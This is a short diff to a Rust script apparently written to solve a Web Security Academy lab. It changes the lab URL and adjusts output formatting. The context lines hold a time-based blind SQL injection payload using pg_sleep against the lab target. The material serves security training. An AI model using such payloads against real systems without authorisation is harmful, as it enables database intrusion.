@@ -31,7 +31,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a30002e035422da80b4e42c000f0043.web-security-academy.net";
+    let url = "https://0ac400ff046ccd62821c426700b700aa.web-security-academy.net";
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
@@ -44,12 +44,12 @@ fn main() {
     // payload to make a 10 seconds delay
     let payload = "' || pg_sleep(10)-- -";
 
-    print!(
-        "\n{}{}",
+    println!(
+        "{}{}",
         "1. Injecting payload to cause a 10 seconds delay.. ".white(),
         "OK".green()
     );
-    print!("\n{}", "2. Waiting for the response.. ".white());
+    print!("{}", "2. Waiting for the response.. ".white());
     io::stdout().flush();
     // fetch the page with the injected payload
     let make_delay = client
